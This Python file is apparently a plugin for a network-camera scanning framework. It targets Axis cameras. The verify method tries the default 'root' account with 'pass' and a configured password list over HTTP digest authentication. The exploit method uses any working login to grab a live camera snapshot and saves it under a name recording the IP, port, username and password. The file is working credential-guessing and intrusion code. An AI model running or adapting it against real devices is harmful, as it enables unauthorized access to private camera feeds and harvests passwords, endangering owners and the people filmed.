import requests

from loguru import logger

from .base import POCTemplate


class AxisWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['axis']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.low
        self.desc = """"""
        self.headers = {'User-Agent': self.config.user_agent}

    def verify(self, ip, port=80):
        _users = ['root']    # default user
        _passwords = ['pass'] + self.config.passwords
        for user in _users:
            for password in _passwords:
                try:
                    r = self.session.get(url=f"http://{ip}:{port}/jpg/image.jpg", auth=requests.auth.HTTPDigestAuth(user, password), timeout=self.config.timeout, headers=self.headers, verify=False)
                    if r.status_code == 200:
                        return ip, str(port), self.product, str(user), str(password), self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        url = f"http://{ip}:{port}/jpg/image.jpg"
        img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
        if self._snapshot(url, img_file_name, auth=requests.auth.HTTPDigestAuth(user, password)):
            return 1
        return 0

POCTemplate.register_poc(AxisWeakPassword)